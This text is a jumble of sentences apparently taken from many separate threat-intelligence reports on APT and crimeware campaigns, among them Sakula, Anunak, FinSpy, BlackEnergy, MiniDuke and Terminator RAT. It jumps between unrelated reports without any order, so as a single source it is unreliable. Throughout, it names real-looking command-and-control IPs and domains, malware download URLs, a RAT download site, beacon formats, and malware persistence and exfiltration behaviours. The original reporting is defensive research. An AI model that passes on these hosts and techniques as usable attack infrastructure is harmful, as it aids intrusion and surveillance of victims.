This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd. Command-and-Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below : Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S.-based IT company with high-profile clients in the defense sector .
The intended target again appeared to be a Mongolian government entity , and the file masqueraded as an installer for Microsoft ActiveX software .
When this file was executed , it caused the victim to view a website by using the ShellExecute ( ) API to open a URL .
All incidents in this campaign were similar in that they utilized malicious droppers masquerading as installers for legitimate software applications like Adobe Reader , Juniper VPN , and Microsoft ActiveX Control .
[ 1 ] The Sakula malware in this campaign utilized the Dynamic Link Library ( DLL ) side-loading technique most commonly associated with PlugX activity .
They display progress bars that make it appear as if the specified software is being updated or installed .
In addition , the droppers all directed victims to login pages for services specific to the target organization like webmail , document sharing , or corporate VPN .
This campaign infected victims with Sakula malware variants that were signed with stolen certificates .
Surtr connects to a command and control server ( C2 ) and downloads a stage two component to % ALL USERS % /Application Data/Microsoft/Windows/Burn/_ [ VICTIM COMPUTER NAME ] .log
Surtr 's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine , viewing web cache , executing remote commands and logging keystrokes .
Malicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory .
Figure 2 : Encrypted data in XC key Figure 3 : Decrypted data ( note : e0 25 is 0x25e0 which is 9696 in hex ) We have seen a large number of similar samples sent to Tibetan groups that use the same stage two ( GmRemote ) and communicate with the following C2s : dtl.dnsd.me , dtl.eatuo.com , dtl6.mooo.com and tbwm.wlyf.org .
It also creates the following folders : % ALL USERS % /Application Data/Microsoft/Windows/123 % ALL USERS % /Application Data/Microsoft/Windows/Burn % ALL USERS % /Application Data/Microsoft/Windows/LiveUpdata_Mem It creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders .
This data can then be sent to the C2 .
In order to store temporary information , Surtr creates the following folders : % ALL USERS % /Application Data/Microsoft/Windows/MpCache % ALL USERS % /Application Data/Microsoft/Windows/nView_DiskLoydb % ALL USERS % /Application Data/Microsoft/Windows/nView_KeyLoydb % ALL USERS % /Application Data/Microsoft/Windows/nView_skins % ALL USERS % /Application Data/Microsoft/Windows/UsbLoydb For example , in nView_DiskLoydb , a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output .
It can also download additional malware onto the victim computer , which can provide attackers with further abilities like accessing the victim computer 's webcam or microphone .
For persistency , Surtr adds a key to the registry to ensure it runs when the infected computer is restarted .
Surtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function .
The window screenshot is shown in the figure below : When the attackers gain access to servers running operating systems of the Linux family they use SSH backdoor that transmits to the malicious server the login/password data used to access the servers and provides attackers remote access to the servers .
Ammy Admin was used for remote access , the same SSHD backdoor was installed on Unix servers and , In addi- tion , it was loaded from the same hacked server as in other cases of trojan Anunak usage .
The Anunak malware has multiple ways of connecting to backends , which includes a PHP based backend reachable over HTTP and HTTPS , and a Windows server based component using a propri- etary protocol .
• The malware sends key information , screenshots and CAB-archives to its management server .
To find interesting infections within this large set of compromised systems , the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/ Windows domain information .
The attackers use BITS to download files , but also make use of Windows built-in PowerShell to download tools and execute commands .
The activity includes port scanning and system reconnaissance , escalating privileges on systems by using for example the recent CVE-2014- 4113 vulnerability , gathering credentials and hop- ping on to other systems and networks .
• The program is able to secretly make changes to a number of system files , presumably to remove the limitations of Microsoft Windows desktop operating systems on the number of users that may simultaneously connect to the correspond- ing PC using RDP to administer it remotely .
Another used method is to install a special malware to carry out targeted attacks via another malware that might appear in the local network by accident .
The attackers buy from these botnet owners the information about IP-addresses of computers where the botnet owners have installed malware and then check whether the IP-address belongs to the financial and government institutions .
Often the user would be presented with a legitimate document or software download they were expecting to see , along with an unseen malicious download .
Targets include government , military , and civilian organizations Spear phishing to carefully-selected target individuals was the primary attack vector identified in the investigation .
Operation Hangover utilizes a very extensive and sophisticated command-and- control infrastructure , likely developed over many months or years by numer- ous developers .
Based on analysis of IP addresses collected from criminal data stores discov- ered during the investigation , it appears that potential victims have been target- ed in over a dozen countries , most heavily represented by Pakistan , Iran , and the United States .
The primary purpose of this long-running , global command-and-control net- work appears to be surveillance against national security interests .
Victims would click on what appeared to be an interesting docu- ment , and begin the long-running infection cycle .
Spear phishing emails targeting upper management appeared to be the source of the infection Through extensive analysis , security analysts at Norman Shark in conjunction with our partners , quickly uncovered a previously unknown and sophisticated infrastructure for targeted attacks .
Favored methods include documents infected with malicious code , along with direction to malicious websites with names deliberately similar to legitimate government , entertainment , security related , and commercial sites .
In many cases , decoy files and websites were used , specifically geared to the particular sensibilities of regional targets including cultural and religious sub- ject matter .
Evidence points to professional project management and outsourcing of key tasks , including some by freelance programmers .
If the recipient falls for the scam , Trojan horse , remote access tool ( RAT ) software is installed on the victim 's computer that can give the attacker keystrokes , screenshots , microphone and webcam recordings , stolen documents , and passwords .
And to make matters worse , compromised systems are used as staging grounds for further attacks on regional targets , by installing illicit command-and-control ( CnC ) servers , abusing legitimate email accounts , and disseminating stolen office documents as `` bait .
To compromise its targets , the SEA often sends socially engineered , spear-phishing emails to lure opposition activists into opening fraudulent , weaponized , and malicious documents .
For example , its payload can arrive at its destination encrypted-and become decrypted and installed only on a target device .
'' FireEye researchers have seen a heavy use of spear phishing and the construction of a `` watering hole , '' in which an important website is hacked in the hope of compromising the computers of its subsequent visitors , who usually belong to a certain VIP-profile the attacker is targeting .
For example , the 2012 Mahdi campaign , which infected targets in the Middle East , used malicious Word documents , PowerPoint files , and PDFs to infect targets .
A given piece of malware , for example , may have been written by an expert but incorrectly used later by an inexperienced foot soldier ( such as a poorly written spear phishing email ) .
At the bottom are the foot soldiers-brute-force hackers who execute orders and wage extended cyber attack campaigns , from network reconnaissance to spear phishing to data exfiltration .
Even more amazing , its malicious behavior was concealed under a veneer of apparently legitimate operational data-but ultimately , the malware destroyed Iranian centrifuges .
Not only did they trick users into executing commands to install malicious code , but they also distracted users from seeing malware-related warning messages .
The functionality of the dropper can be summarized in the following steps : • Sandbox check and anti virus product enumeration • Dropping payload 'netmgr.exe' • Creating a registry key for persistence • Creating a registry key for deletion of the dropper Searching for a sandbox environment , the malware takes a number of simple steps to verify .
For stealthiness the malware can either inject itself as a remote thread to a running svchost.exe process or perform the same procedure on a newly created one .
All data exchanged with any of the C & C servers as well as data stored to a file on disk is encrypted with the according key .
After start-up the malware aims to inject itself to an svchost.exe process .
Hearer 2 also creates a swap file named perf.tmp2 , which helps in selectively editing the initial task file and in managing the task list .
The malware seeks to keep a low profile on the infected machine , while executing the botmaster 's commands and Lua scripts .
The work flow for each hearer per execution loop in the main thread is as follows : • Read and decrypt content from according net.cap-file • See if an entry of the C & C command list can be found in the decrypted data • If so , execute the command • Hand the data over to the Lua interpreter thread • See if a Lua script can be located , searching for start and end sentinel • If so , start Lua thread and execute script • If more than one script can be found start more Lua threads recursively After starting the Lua thread requests a value from Windows registry named 'EnableLua' under SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System .
The command_key is used to decrypt commands received from the C & C server , the storage_key is used to encrypt and decrypt data being stored to files on disk and the response_key will encrypt callbacks to the C & C server .
maxpostdata – Set a limit for data size to be sent to C & C via registry to limit data traffic .
Interestingly , the dropper also changes the creation time stamp of the newly created binary to time stamp of the system executable explorer.exe .
5.5 Remote code execution vulnerability After a full analysis of the communication protocol , we identified a vulnerability in the Command & Control executable : The server does not correctly parse the data sent by the infected machine .
Here are some screenshots of the administration interface : Figure 14 : Terminator : List of processes on the infected machine Figure 15 : Terminator : List of opened ports on the infected machine Figure 16 : Terminator : Remote shell on the infected machine Figure 17 : Terminator : Registry access to the infected machine Figure 18 : Terminator : Services management on the infected machine Figure 19 : Terminator : Information about the infected machine Figure 20 : Terminator : Installed software on the infected machine 5.4 Scanner We decided to create a scanner to identify the servers which were running Terminator .
1.5 Document structure This document is structured in the following way :  Chapter 2 deals with the information gathering phase ;  Chapter 3 describes the malware Poison Ivy and a vulnerability of it ;  Chapter 4 is a static analysis of samples ;  Chapter 5 deals with the information we gathered on the attacked command & control ;  Chapter 6 introduces an homemade RAT called terminator ; 2.1 Command & Control scanner In the Mandiant report , it is explained that the attacker used a well-known Remote Administration Tool ( RAT ) called Poison Ivy .
We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server .
This vulnerability allows the remote execution of arbitrary code on the command & control server .
The syntax on the Poison Ivy server is : xport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number The Poison Ivy server is managed by the attackers through a VMWare remote desktop , so that we were not able to get the real IP address of the attacker .
3.1 Description Poison Ivy is a Remote Administration Tool ( RAT ) available here : http : //www.poisonivy- rat.com/index.php ? link=download .
This RAT can be freely downloaded here : http : //www.poisonivy- rat.com/ .
24 Figure 20 : Terminator : Installed software on the infected machine ...
The communication scheme is really weird , the infected machine ( the client ) sent HTML to the C & C .
! 1/j|n\C : \Documents and Settings\ { Username } \Local Settings\Application DataldoDrZdpkK.jpg – Windows Internet Explorer [ endof ] ! 0/j|n\Syrian Malware/j|n\ { Hostname } /j|n\ { Username } /j|n\USA/j|n\Win XP ProfessionalSP2 x86/j|n\No/j|n\0.1/j|n\/j|n\C : \Documents and Settings\ { Username } \Local Settings\Application DataldoDrZdpkK.jpg – { ActiveWindowName } /j|n\ [ endof ] Determining which groups use which malware is often very difficult .
The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload , but does n't allow any configuration other than the IP address for command and control ( C2 ) .
BlackWorm v2.1 has the same abilities as the original version and additional functionality , including bypassing UAC , disabling host firewalls and spreading over network shares .
E.exe , ( MD5 : a8cf815c3800202d448d035300985dc7 ) a binary that drew our attention , looked to be a backdoor with the Syrian Malware strings within it .
Configuration options within code The malware communicated out to 178.44.115.196 , over port 5050 , with a command structure of : ! 0/j|n\12121212_64F3BF1F/j|n\ { Hostname } /j|n\ { Username } /j|n\USA/j|n\Win 7 Professional SP1 x86/j|n\No/j|n\2.4.0 [ Dark Edition ] /j|n\/j|n\ { ActiveWindowName } /j|n\ [ endof ] When looking at samples of Dark Edition BlackWorm being used by the Syrian Malware Team , the strings '' Syrian Malware , '' or `` Syrian Malware Team '' are often used in the C2 communications or within the binary strings .
When executed , the binary beacons to aliallosh.sytes.net on port 1177 .
Facebook posting of virus scanning of files While looking for Dark Edition samples , we discovered a binary named svchost.exe ( MD5 : 015c51e11e314ff99b1487d92a1ba09b ) .
The string `` Rania '' used as a lure was in Arabic and likely refers to the prolific Queen Rania of Jordan .
Additional pivoting off of svchost.exe brought us to three additional samples apparently built with BlackWorm Dark Edition .
Building binary through BlackWorm v0.3.0 BlackWorm v0.3.0 controller BlackWorm v0.3.0 supports the following commands between the controller and the implant : In addition to the features supported by the command structure , the payload can : Seek and kill no-ip processes DUC30 and DUC20 Disable Task Manager to kill process dialog Copy itself to USB drives and create autorun entries Copy itself to common peer-to-peer ( P2P ) share locations Collect system information such as OS , username , hostname , presence of camera , active window name , etc. , to display in the controller Kill the following analysis processes ( if found ) : procexp SbieCtrl SpyTheSpy SpeedGear Wireshark MBAM ApateDNS IPBlocker cPorts ProcessHacker AntiLogger The Syrian Malware Team primarily uses another version of BlackWorm called the Dark Edition ( v2.1 ) .
The downloaded file is actually the Stealer malware that exfiltrates stolen data to an FTP server .
The page is used to steal legitimate credentials , but once users enter the credentials , they are often redirected to a new page that prompts them to download a `` Browser Patch '' or other similar type of file .
The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool : You can use this rule with CrowdStrike 's free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .
The website does not appear to deliver any malware , so its most likely purpose is to act as a credential-collection mechanism much like the spoofed Institute of Electrical and Electronics Engineers ( IEEE ) Aerospace Conference website ( aeroconf2014 [ .
The registrant email that currently appears in the Whois records of some of the FLYING KITTEN domains is info [ @ ] usa.gov.us , however historical records show that the domains were originally registered under the email address keyvan.ajaxtm [ @ ] gmail.com .
For example , the adversary will register a domain that spoofs the name of the targeted organization and then host a spoofed login page on that site .
] com .
This spoofed recruiting company website could be used to target entities across a wide range of sectors .
Attribution in this case is interesting , as the adversary appears to have made a mistake when registering its malicious domains .
] org ) the adversary used earlier this year .
e. Download backdoor : Downloads dropper file pao.exe from http : //www.hisunpharm.com/files/File/product/ and stores it to C : \Program Files\tongji2.exe f. Drops and execute batch file : schedules downloader every 30 minutes and ensures svchest.exe is started with Local System privileges .
The attackers compromised the server and created a Trojan that would be downloaded to user computers during a routine update .
During this time attackers used C & C servers to monitor the activities on the infected machines and uploaded tools on a previously compromised legitimate Taiwanese website .
A vast array of components was implemented in the malware including four 0-Day exploits , a windows rootkit , antivirus evasion techniques , complex process injection and hooking code , network infection routines , peer-to-peer updates , a command and control interface , as well as the first ever PLC rootkit .
This malware allowed attackers to control the computer as a compromised zombie part of a wider botnet network – a theory suggested by Alienvault – which then wiped hard disks , and harvested personal information .
Command & control ( C & C ) : Using a simple XOR loop for encryption , the malware attempts to connect to laoding521.eicp.net over port 889 to communicate with the attackers .
d. Information harvesting : After gaining root privileges the attackers can intercept any information that goes in or out of the infected computer .
d. Makes itself persistent : Modifies the Windows registry by adding value with name `` skunser '' and data `` C : \ntldrs\svchest.exe '' , where it was previously copied to .
Stuxnet 's main payload has the main purpose of modifying code on Siemens industrial PLCs in order to sabotage the system .
To increase the probability of successfully infecting the target systems , various propagation vectors should be embedded into the malware .
An in-depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post : The Smartphone Who Loved Me : FinFisher Goes Mobile ? The sample included a configuration file that indicates available functionality , and the options that have been enabled by those deploying it : Interestingly , the configuration file also specifies a Vietnamese phone number used for SMS based command and control : The command and control server is in a range provided by the CMC Telecom Infrastructure Company in Hanoi : This server was active until very recently and matched our signatures for a FinSpy command and control server .
The attachments we analyzed sent data to a command & control server inside Bahrain .
The malware communicates with a FinSpy Command & Control server in Ethiopia , which was first identified by Rapid7 in August 2012 .
Just like Bahraini samples , the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user .
The existence of a FinSpy sample that contains Ethiopia-specific imagery , and that communicates with a still-active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy .
The sample communicates with a command & control server in Vietnam , and exfiltrates text messages to a Vietnamese telephone number .
The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server .
We found an Android FinSpy Mobile sample in the wild with a command & control server in Vietnam that also exfiltrates text messages to a local phone number .
Both the command & control server IP and the phone number used for text-message exfiltration are in Vietnam which indicates a domestic campaign .
This post adds to the list by providing an updated list of FinSpy Command & Control servers , and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam .
The screenshot below reveals that the actual file behind this shortcut points to a different program : conime.exe : The `` Cohhoc '' malware is a Remote Administration Tool and is able to :  execute commands or scripts ;  download files ;  upload files ;  collect information about the infected system , for example hostname , username , version of the operating system , installed software ;  find specific documents in order to send them to the command and control servers .
If the processes are not running on the infected system , the injection is performed into explorer.exe .
The tool allows the attackers :  to execute code on the infected system ;  to download files ;  to get information about the infected system ;  to steal data such as Office documents or media files .
Within the samples , we found two different hardcoded command and control servers and a feature to easily choose an alternative server .
The following tag , inside the document , reveals this function : As soon as the document is loaded , a network query is performed and notifies the attacker about the successful exploit and the availability of a newly infected machine .
The installed file and the registry modifications are stored in a resource within the dropper .
Here is an example of a request performed by an infected system : The relevant data is placed after the GET request .
The attackers ' modus operandi is to carry out spear phishing using a malicious Microsoft Office document as an attachment .
The exploit used by the attackers is identified and blocked by G DATA 's Exploit Protection technology and G DATA 's security solutions detect the dropped binaries as Win32.Trojan.Cohhoc.A and Win32.Trojan.DirectsX.A respectively .
The obfuscation is used :  to encode the command and controls ;  to encode the data sent to the command and controls ( information and documents ) ;  to decode the data received from the command and controls ( the commands ) .
The config files within BE2 contained the settings of the company 's internal web proxy : As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in-memory ) , the administrators were able to collect BE2 files from the infected machines .
The comment includes a punchy message for `` kasperRsky '' : Killint.tcl – uses Ciscoapi.tcl , implements destroying functions : The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .
Kaspersky Lab detects 'BlackEnergy3 ' malware as Backdoor.Win32.Fonten – naming it after its dropped file `` FONTCACHE.DAT '' When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first-stage tool on this network .
After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .
The 'vsnet ' plugin was intended to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network .
Challenges , like mitigating the attackers' lateral movement across compromised network routers , may take an organization 's defenders far beyond their standard routine and out of their comfort zone .
One of the discovered config files contained a URL with an as yet unidentified md5 : hxxps : //46.165.222 ( dot ) 28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy .
The second organization was hacked via the first victim 's stolen VPN credentials .
Finally , each CnC server hosts a different set of plugins , meaning that each server works with different victims and uses plugins based on its current needs .
During an extended period , we were able to collect many Windows plugins from different CnC servers , without ever noticing Linux plugins being downloaded as described above .
The malware is capable of the following cyber-espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .
Any communication with them must be considered extremely suspicious java.serveblog.net agaliarept.com frejabe.com grannegral.com plushbr.com xmailliwx.com blogwhereyou.com ( sinkholed by Kaspersky Lab ) grannegral.com ( sinkholed by Kaspersky Lab ) Creates the file Java Update.lnk pointing to appdata/Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .
The malware is distributed via social engineering techniques , which includes spear-phishing emails and infections via Web by a fake Blog website .
During this investigation , we also discovered many other the files installing this cyber-espionage tool in what appears to be a dedicated a spear phishing campaign .
These files display a PowerPoint presentation that installs the malware on the target system once the file is opened .
These are the names of the PowerPoint attachments : Hermosa XXX.pps.rar Suntzu.rar El arte de la guerra.rar Hot brazilian XXX.rar These files are in reality Nullsoft Installer self-extracting archives and have compilation dates going back to 2008 .
A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation .
In addition to Windows components , we also found a mobile ( Android ) component .
Here are some screnshots of the mentioned files : A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware .
Also the following link to one known infection artifact : hxxp : //name.domain.org/nickname/set/Signed_Update.jar The following are domains found during the infection campaign .
The encrypted commands that are accepted are : Sleep : Commands the backdoor to sleep for specified number of minutes We have received a sleep command of `` sleep:120 '' during our analysis which means that the malware will wait for 2hrs before establishing a connection again to the C & C server Download : < download_url > Commands the backdoor to download and execute a file ( most probably another Win32 executable ) from a specified URL The C & C servers used in this campaign are found to be newly registered and also short-lived , making it difficult for us to track the malware 's behavior .
'' Listed below are the backdoor commands we were able to see from our analysis : Variant 1 `` run1 '' – open a remote shell `` run2 '' – pipe shell commands from URL1 `` run3 '' – pipe shell commands from URL2 `` http '' – pipe shell commands from C2 `` x_ '' – sleep for specified number of minutes Variant 2 `` sleep : '' – sleep for specified number of minutes `` download : '' – download and execute another executable from C2 Attribution Attribution of campaigns and attack methods can often be difficult .
This sample drops the file UIODsevr.exe , its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of communicating to its C & C at skys { BLOCKED } com .
When executed , it drops and opens a valid PDF file , which was most probably taken from the target organization 's website .
To lure the target into downloading the file , the attacker serves the archive under a URL path named after the target organization 's name as cited below : http : // { malicious domain } / { organization name } / { legitimate archive name } .zip
) This backdoor connects to http : //www.micro { BLOCKED } .
The Siesta Campaign : A Case Study We are currently investigating an incident that involved attackers sending out spear-phishing emails addressed to executives of an undisclosed company .
com/index.html , which are its command-and-control ( C & C ) servers .
This backdoor component is named google { BLOCKED } .exe
Instead of using attachments and document exploits , this specific campaign served their malware through a legitimate-looking file download link .
So , the dropper creates three files in the C : WindowsSystem32 directory : netsvcs.exe - the modified Team Viewer client ; netsvcs_ko.dll - resources library of Team Viewer client ; vcmon.exe - installer/starter ; and creates the service `` Remote Access Service '' , adjusted to execute C : WindowsSystem32vcmon.exe at system startup .
It is interesting that the module does not search for all the HWP files on infected computer , but reacts only to those that are opened by the user and steals them .
After sending , the malware executes the real Hangul word processing application `` Hwp.exe '' to open the .HWP
When running on Windows 7 , the malicious library uses the Metasploit Framework 's open-source code Win7Elevate to inject malicious code into explorer.exe .
The malicious samples we found are the early stage malware most often delivered by spear-phishing e-mails .
This data is also sent , but RSA encrypted .
The next program sent to victims enumerates all the drives on the infected system and executes the following command on them : dir < drive letter > : /a /s /t /-c In practice , this command is written to C : WINDOWSmsdatt.bat and executed with output redirected to C : WINDOWSmsdatl3.inc .
Due to expensive work of malware with variety of additional files , it 's not out of place to show these '' relationships '' in a diagram : This module intercepts HWP documents on an infected computer .
The malware also retrieves instructions from the mail server .
document , the malware program itself is executed to open the .HWP
 Abuse of Code Signing infrastructure to validly sign custom backdoor malware ;  Exploiting systems using different SETHC.exe methods accessible via Remote Desktop Protocol ( RDP ) ;  Long history of IP/DNS telemetry allowing for historical research and link analysis ;  Placement of malicious proxy tools introduced into the environment on Windows server based proxies to bypass proxy logging ;  Extensive use of time/date stomping of malicious files to hinder forensic analysis ; and  Malware leveraging compromised credentials to bypass authentication NTLM proxies ( proxy aware ) .
Furthermore , this Trojan also drops a driver file on the system named : { 93144EB0-8E3E-4591-B307-8EEBFE7DB28F } .sys
The client Trojan service sends the password after obfuscating it with a 4-byte XOR key , which is dynamically generated and sent with the rest of the data .
ShellCrew_Digital_Appendix.zip File Hash : 4e324ffae9ce8688bdb2f569274dff7c ShellCrew_Digital_Appendix.zip Contents :  ECAT_Blacklist ( Folder containing ECAT Hash Import ) o Derusbi_Notepad.xml  feeds folder ( Folder containing SA feeds , Shell_Crew Domains and IPs ) o Derusbi_Domain.feed o Derusbi_Domain.csv ( List of Shell_Crew Domains ) o derusbi_domain.xml o Derusbi_IP.feed o Derusbi_IP.txt ( List of Shell_Crew IPs ) o derusbi_ip.xml  parsers folder ( Folder containing SA parsers ) o derusbi_server.lua ( Parser for Derusbi Handshake ) o derusbi_variant.parser ( Parser for Derusbi variant beaconing )  ShellCrewHashset.md5 file ( List of Shell_Crew File/Tool Hashes )  yara folder ( Folder containing Yara sigs ) o Shell_Crew.yara For any questions or issues deploying the Security Analytics or ECAT content into your environment , please contact RSA Support .
The file downloaded from the remote system to the ColdFusion server , 1234.zip , is a ColdFusion Web shell called `` cfm backdoor by ufo '' .
This Trojan has an embedded and encoded driver file that is written to the infected system and then launched .
In addition to traditional Trojans that beacon out to a destination IP address , this adversary has also been observed utilizing the following entrenchment techniques ;  Installation of Web shells ;  Registering DLLs with Internet Information Services ( IIS ) ;  Modifying the 'System.Web.dll ' file ;  Trojan.Derusbi ; and  Utilizing the RDP backdoor 'sethc.exe ' .
This Trojan family provides attackers a backdoor into the enterprise , as well as functionality to locate and decrypt passwords stored on the system by web browsers like Firefox and Internet Explorer , gather system and network information , and upload or download files .
Using the tools uploaded to the server , Shell_Crew dumped password hashes from the compromised system , performed network reconnaissance , and moved laterally to systems in the internal network using the compromised credentials with the pass-the-hash technique .
Figure 9 below is an example where a malicious DLL was registered with the IIS Web server using the command line .
The backdoor connects to the following C2 for instructions : news [ dot ] grouptumbler [ dot ] com/news/feed.php IP : 200.63.46.23 It supports several commands , such as copy file , move file , remove file , make directory , kill process and of course , download and execute new malware .
Here 's what one of these GIF files looks like : Here 's one example of a malicious request for the C2 domain `` arabooks*dot+ch '' : arabooks.ch/lib/index.php ? ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp [ REMOVED ] lhUDx vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw== The picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data , known as 'steganography ' : At offset 0x6a4 inside the GIF file , there is a hidden encrypted PE file .
While we were analyzing the samples , the attackers connected to the C2 and added a custom backdoor as `` 1109821546.gif '' : `` http : //tsoftonline.com/views/img/1109821546.gif '' HTTP/1.1 200 OK Date : Mon , 25 Feb 2013 12:34:13 GMT Server : Apache Last-Modified : Mon , 25 Feb 2013 10:59:49 GMT ETag : `` 7c8251-5190d-4d68a708d9340 '' Accept-Ranges : bytes Content-Length : 334093 Content-Type : image/gif This custom backdoor , referred to as `` stage 3 '' , is much bigger than the previous ones – 300K+ in size .
To gain control at boot , it writes a randomly named LNK file to the startup folder , which in turn calls the main body using rundll32 : In the picture above , the malware 's main body is stored as `` stat.bin '' ( a randomly selected name ) in the `` Adobe '' folder .
The third block fetches information about the infected system with calls to gather information about the CPU , drive and the computername - these are used to decrypt the backdoor 's main body , which is custom encrypted for each unique victim .
It is written to the Internet cache directory and then opened using a simple BAT file : TASKKILL /F /IM acro* ping -n 1 127.0.0.1 > nul start `` '' `` % path to decoy PDF document % '' The filenames of the dropped files are hardcoded in their resources .
Note : We detect the malware described here as HEUR : Backdoor.Win32.MiniDuke.gen , Backdoor.Win32.Miniduke while the documents with exploits are detected as Exploit.JS.Pdfka.giy .
Following the SHA-1 hash generation , the backdoor will base64 encode its unique hash for later C2 communication .
In our case , this did n't appear to work very well : Several different variants of the 2nd stage backdoors have been observed on the C2 ; they all perform similar functions but are encrypted with different keys and contact different C2s .
Resource 101 is the main backdoor DLL component .
Attackers often use publicly available RATs like Gh0st , PoisonIvy , Hupigon , and DRAT , and `` closed-released '' RATs like MFC Hunter and PlugX.1 However , the network traffic these RATs produce is well-known and easily detectable although attackers still successfully use them.2 Attackers always look for ways to blend their malicious traffic with legitimate traffic to avoid detection .
Attackers often use remote access Trojans ( RATs ) , which typically have graphical user interfaces ( GUIs ) and remote desktop features that include directory browsing , file transfer , and the ability to take screenshots and activate the microphone and web camera of a compromised computer .
It then adds the following registry entry to enable its automatic execution at every system startup : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\policies\Explorer\run tpbar = `` % System % \tpframe.exe '' The network traffic the malware produces is designed to look like Windows Messenger traffic .
This is a fairly rudimentary disguise and odd because you would expect HTML to be the result of a request to a web server and not as something a client would send to a web server .
file packed with UPX is dropped.6 After initially dropping the malicious file named hkcmd.exe to the % Temp % folder , the malware typically copies itself using the name , tpframe.exe , to the % System % folder .
It appears that attackers may specify any kind of fake headers within the first 32 bytes in order to disguise the subsequent network traffic .
The following bits of information are initially sent by the compromised host when the communication starts : • User name • Computer name • OEM code page identifier • What looks like a campaign code but only for some samples The commands are not preconfigured as the malware relies on the data sent by the server .
All three versions of the FAKEM RAT that we investigated were distributed via spear-phishing emails using social engineering to lure targets into executing a malicious attachment .
To determine the RAT 's capabilities , we allowed the attackers to infiltrate a honeypot computer and captured all of the network traffic it generated .
While it is possible to distinguish the network traffic FAKEM RAT variants produce for the legitimate protocols they aim to spoof , doing so in the context of a large network may not be not easy .
As shown in Figure 1 , the adversary sends a malicious Word document , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) , that exploits CVE-2012-0158 , which subsequently drops a malware installer named `` DW20.exe '' .
The RAT ( svchost_.exe ) will collaborate with its relay ( sss.exe ) to communicate with the command and control server .
The malware connected to the same command and control server , liumingzhen.zapto.org , but the callback is quite different : XYZ /WinData.DLL ? HELO-STX-1*1 [ IP Address ] * [ Computer Name ] *0605 [ MAC : [ Mac Address ] ] $ In a separate case where liumingzhen.zapto.org has been used as the command and control server , the payload was neither WinData nor Terminator RAT , but another type of malware known as Protux .
The sample we analyzed ( md5 : 50d5e73ff8a0693ed2ee2d320af3b304 ) exploits CVE-2012-0158 and has the following command and control server : catlovers.25u.com / 123.51.208.142 The command and control servers for both samples resolved to IP addresses in the same class C network .
This component plays the role as a network relay between the malware and the proxy server , by listening over port 8000 .
This particular sample is configured to one of two command and control servers : liumingzhen.zapto.org / 123.51.208.69 liumingzhen.myftp.org / 123.51.208.69 We have located another malicious document that has a Taiwan-related decoy document that drops this same version of Terminator RAT .
If the response is 200 , it will then start to create a `` relay link '' between the malware and the CnC server ( see Figure 5 ) .
We recently analyzed a sample that we suspect was sent via spear-phishing emails to targets in Taiwan .
Detection of exploitation and identification of anomalous callbacks are becoming extremely critical in preventing the malware from installing into the system or phoning back to the command control servers .
To achieve this , it first tries to identify the list of proxy servers that are used within the system using '' WinHttpGetIEProxyConfigForCurrentUser '' , and the discovered proxy servers and related ports are stored in the same directory in a file named `` PROXY '' ( see Figure 4 ) .
This functions when it is executed the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get commands via HTTP GET request using parameters specified in tv.cfg : http : // < server > /tv/getinfo.php ? id= ...
This module installed with Teamviewer 6 allows the attackers to access computer desktop remotely , activate webcam or microphone , download or upload files to the infected machine and many more .
The tool has internal code in the log file : 01.01.01 The main procedures starts from generating output file path and creating the corresponding file : % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll2.txt After that the code iterates through all available logical drives and searches for the files matching the following patterns : Information about discovered files will be saved in a temporary file created in % TEMP % folder and after the search is finished it will be copied to the following file : The temporary file name is created using GetTempFileNameA system API , which creates a temp file name of the following format : < uuuu > .TMP
